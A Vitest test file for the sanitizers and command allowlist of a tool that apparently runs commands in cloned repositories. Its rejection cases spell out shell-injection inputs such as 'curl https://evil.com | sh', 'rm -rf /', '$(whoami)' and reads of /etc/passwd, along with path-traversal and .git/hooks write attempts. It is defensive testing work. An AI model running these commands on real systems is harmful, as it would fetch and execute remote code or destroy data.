import { describe, it, expect } from "vitest";
import {
    validateBranchName,
    validateRepoUrl,
    validatePatchPath,
    tokenizeCommand,
} from "../src/sanitize.js";
import { isCommandAllowed, filterCommands } from "../src/executor/policy.js";

// ─── validateBranchName ──────────────────────────────────────

describe("validateBranchName", () => {
    it("should accept valid branch names", () => {
        expect(validateBranchName("main")).toBe("main");
        expect(validateBranchName("develop")).toBe("develop");
        expect(validateBranchName("feat/new-feature")).toBe("feat/new-feature");
        expect(validateBranchName("release/1.0.0")).toBe("release/1.0.0");
        expect(validateBranchName("fix_some-bug.1")).toBe("fix_some-bug.1");
    });

    it("should reject shell injection attempts", () => {
        expect(() => validateBranchName("main; rm -rf /")).toThrow();
        expect(() => validateBranchName("main && curl evil.com")).toThrow();
        expect(() => validateBranchName("$(whoami)")).toThrow();
        expect(() => validateBranchName("main`id`")).toThrow();
        expect(() => validateBranchName("branch | cat /etc/passwd")).toThrow();
    });

    it("should reject empty or whitespace-only", () => {
        expect(() => validateBranchName("")).toThrow();
        expect(() => validateBranchName("   ")).toThrow();
    });

    it("should reject overly long names", () => {
        const longName = "a".repeat(256);
        expect(() => validateBranchName(longName)).toThrow();
    });
});

// ─── validateRepoUrl ─────────────────────────────────────────

describe("validateRepoUrl", () => {
    it("should accept valid HTTPS URLs from allowed hosts", () => {
        expect(validateRepoUrl("https://github.com/org/repo.git")).toBe("https://github.com/org/repo.git");
        expect(validateRepoUrl("https://gitlab.com/org/repo.git")).toBe("https://gitlab.com/org/repo.git");
        expect(validateRepoUrl("https://bitbucket.org/org/repo.git")).toBe("https://bitbucket.org/org/repo.git");
    });

    it("should accept owner/repo format", () => {
        expect(validateRepoUrl("org/repo")).toBe("org/repo");
        expect(validateRepoUrl("my-user/my-repo")).toBe("my-user/my-repo");
    });

    it("should reject non-HTTPS protocols", () => {
        expect(() => validateRepoUrl("http://github.com/org/repo")).toThrow();
        expect(() => validateRepoUrl("ftp://github.com/org/repo")).toThrow();
        expect(() => validateRepoUrl("javascript:alert(1)")).toThrow();
    });

    it("should reject unknown hosts", () => {
        expect(() => validateRepoUrl("https://evil.com/payload.sh")).toThrow();
        expect(() => validateRepoUrl("https://attacker.io/exploit")).toThrow();
    });

    it("should reject empty input", () => {
        expect(() => validateRepoUrl("")).toThrow();
    });
});

// ─── validatePatchPath ───────────────────────────────────────

describe("validatePatchPath", () => {
    it("should accept valid relative paths", () => {
        expect(validatePatchPath("src/index.ts")).toBe("src/index.ts");
        expect(validatePatchPath("README.md")).toBe("README.md");
        expect(validatePatchPath("src/utils/helper.ts")).toBe("src/utils/helper.ts");
        expect(validatePatchPath("test/fixtures/data.json")).toBe("test/fixtures/data.json");
    });

    it("should reject path traversal", () => {
        expect(() => validatePatchPath("../../etc/passwd")).toThrow();
        expect(() => validatePatchPath("src/../../secret")).toThrow();
        expect(() => validatePatchPath("../outside")).toThrow();
    });

    it("should reject absolute paths", () => {
        expect(() => validatePatchPath("/etc/passwd")).toThrow();
        expect(() => validatePatchPath("\\windows\\system32")).toThrow();
    });

    it("should reject null bytes", () => {
        expect(() => validatePatchPath("src/index.ts\0.exe")).toThrow();
    });

    it("should reject .git directory writes", () => {
        expect(() => validatePatchPath(".git/hooks/pre-commit")).toThrow();
        expect(() => validatePatchPath(".git")).toThrow();
    });

    it("should normalize backslashes", () => {
        expect(validatePatchPath("src\\utils\\helper.ts")).toBe("src/utils/helper.ts");
    });

    it("should reject empty paths", () => {
        expect(() => validatePatchPath("")).toThrow();
    });
});

// ─── tokenizeCommand ─────────────────────────────────────────

describe("tokenizeCommand", () => {
    it("should tokenize simple commands", () => {
        expect(tokenizeCommand("npm test")).toEqual(["npm", "test"]);
        expect(tokenizeCommand("npm run build")).toEqual(["npm", "run", "build"]);
        expect(tokenizeCommand("pytest")).toEqual(["pytest"]);
    });

    it("should handle extra whitespace", () => {
        expect(tokenizeCommand("npm   test")).toEqual(["npm", "test"]);
        expect(tokenizeCommand("  npm test  ")).toEqual(["npm", "test"]);
    });

    it("should handle single-quoted strings", () => {
        expect(tokenizeCommand("echo 'hello world'")).toEqual(["echo", "hello world"]);
        expect(tokenizeCommand("git commit -m 'fix bug'")).toEqual(["git", "commit", "-m", "fix bug"]);
    });

    it("should handle double-quoted strings", () => {
        expect(tokenizeCommand('echo "hello world"')).toEqual(["echo", "hello world"]);
    });

    it("should handle -- separator", () => {
        expect(tokenizeCommand("npm test -- --coverage")).toEqual(["npm", "test", "--", "--coverage"]);
    });

    it("should reject empty commands", () => {
        expect(() => tokenizeCommand("")).toThrow();
        expect(() => tokenizeCommand("   ")).toThrow();
    });
});

// ─── Policy (allowlist + arg schema) ─────────────────────────

describe("Execution Policy (allowlist)", () => {
    describe("strict mode", () => {
        it("should allow whitelisted npm commands", () => {
            expect(isCommandAllowed("npm ci", "strict")).toBe(true);
            expect(isCommandAllowed("npm install", "strict")).toBe(true);
            expect(isCommandAllowed("npm test", "strict")).toBe(true);
            expect(isCommandAllowed("npm run build", "strict")).toBe(true);
        });

        it("should allow whitelisted pnpm/yarn commands", () => {
            expect(isCommandAllowed("pnpm install", "strict")).toBe(true);
            expect(isCommandAllowed("pnpm test", "strict")).toBe(true);
            expect(isCommandAllowed("yarn test", "strict")).toBe(true);
            expect(isCommandAllowed("yarn run lint", "strict")).toBe(true);
        });

        it("should allow whitelisted test frameworks", () => {
            expect(isCommandAllowed("pytest", "strict")).toBe(true);
            expect(isCommandAllowed("python -m pytest", "strict")).toBe(true);
            expect(isCommandAllowed("go test ./...", "strict")).toBe(true);
            expect(isCommandAllowed("cargo test", "strict")).toBe(true);
            expect(isCommandAllowed("dotnet test", "strict")).toBe(true);
            expect(isCommandAllowed("mvn test", "strict")).toBe(true);
            expect(isCommandAllowed("gradle test", "strict")).toBe(true);
        });

        it("should allow whitelisted utility commands", () => {
            expect(isCommandAllowed("cat package.json", "strict")).toBe(true);
            expect(isCommandAllowed("ls", "strict")).toBe(true);
            expect(isCommandAllowed("echo hello", "strict")).toBe(true);
            expect(isCommandAllowed("pwd", "strict")).toBe(true);
        });

        it("should allow whitelisted git commands (read-only)", () => {
            expect(isCommandAllowed("git status", "strict")).toBe(true);
            expect(isCommandAllowed("git diff", "strict")).toBe(true);
            expect(isCommandAllowed("git log", "strict")).toBe(true);
        });

        it("should BLOCK git push and git commit", () => {
            expect(isCommandAllowed("git push", "strict")).toBe(false);
            expect(isCommandAllowed("git commit -m 'msg'", "strict")).toBe(false);
        });

        it("should block non-whitelisted commands in strict mode", () => {
            expect(isCommandAllowed("node server.js", "strict")).toBe(false);
            expect(isCommandAllowed("curl https://evil.com", "strict")).toBe(false);
            expect(isCommandAllowed("wget file", "strict")).toBe(false);
            expect(isCommandAllowed("python setup.py install", "strict")).toBe(false);
        });
    });

    describe("shell metacharacter blocking", () => {
        it("should block commands with semicolons", () => {
            expect(isCommandAllowed("npm test; curl evil.com", "permissive")).toBe(false);
            expect(isCommandAllowed("npm test; rm -rf /", "strict")).toBe(false);
        });

        it("should block commands with pipes", () => {
            expect(isCommandAllowed("curl https://evil.com | sh", "permissive")).toBe(false);
        });

        it("should block commands with ampersands", () => {
            expect(isCommandAllowed("npm test && curl evil.com", "permissive")).toBe(false);
        });

        it("should block commands with backticks", () => {
            expect(isCommandAllowed("echo `whoami`", "permissive")).toBe(false);
        });

        it("should block commands with $() substitution", () => {
            expect(isCommandAllowed("echo $(id)", "permissive")).toBe(false);
        });

        it("should block commands with backslashes", () => {
            expect(isCommandAllowed("npm test\\nmalicious", "permissive")).toBe(false);
        });
    });

    describe("permissive mode", () => {
        it("should allow non-listed commands if no forbidden chars", () => {
            expect(isCommandAllowed("node server.js", "permissive")).toBe(true);
            expect(isCommandAllowed("python setup.py install", "permissive")).toBe(true);
        });

        it("should still block forbidden metacharacters", () => {
            expect(isCommandAllowed("sudo rm -rf /; echo done", "permissive")).toBe(false);
        });
    });

    describe("filterCommands", () => {
        it("should partition commands into allowed and blocked", () => {
            const commands = [
                "npm test",
                "npm test; curl evil.com",
                "npm run build",
                "curl https://evil.com | sh",
            ];

            const result = filterCommands(commands, "strict");
            expect(result.allowed).toEqual(["npm test", "npm run build"]);
            expect(result.blocked).toEqual(["npm test; curl evil.com", "curl https://evil.com | sh"]);
        });

        it("should handle empty command list", () => {
            const result = filterCommands([], "strict");
            expect(result.allowed).toEqual([]);
            expect(result.blocked).toEqual([]);
        });
    });
});
